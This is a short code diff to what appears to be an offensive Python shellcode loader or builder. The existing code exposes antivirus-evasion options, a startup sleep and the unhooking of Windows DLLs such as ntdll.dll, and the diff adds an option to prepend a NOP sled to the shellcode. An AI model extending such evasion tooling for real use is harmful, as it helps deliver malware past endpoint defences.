@@ -91,6 +91,10 @@ def generate_random_key(length):
     return secrets.token_bytes(length)
 
 
+def generate_nops(length):
+    return b'\x90' * length
+
+
 def convert_hex_string_to_bytes(string):
     """Converts an hex string (\x00\x00) to its actual bytearray representation."""
     mid = string.replace('\\x', '')
@@ -128,6 +132,7 @@ def main():
 
     parser.add_argument('--sleep-evasion', default=0, type=int, help="Sleeps for x seconds when the program is initially launched.")
     parser.add_argument('--unhook-dll', action='append', help="Unhooks the indicated DLLs at runtime (C:\\Windows\\System32\\ntdll.dll).")
+    parser.add_argument('--pre-nops', type=int, help="Preprends the shellcode with the given number of NOPs.")
 
     args = parser.parse_args()
 
@@ -140,6 +145,11 @@ def main():
     else:
         print("Error: either the -sf or the -ss option needs to be provided.")
         sys.exit(-2)
+
+    # Adds the NOPs if requested.
+    if args.pre_nops:
+        print("Adding NOPs...")
+        shellcode = generate_nops(args.pre_nops) + shellcode
 
     if args.verbose:
         print("Shellcode: {}".format(shellcode))
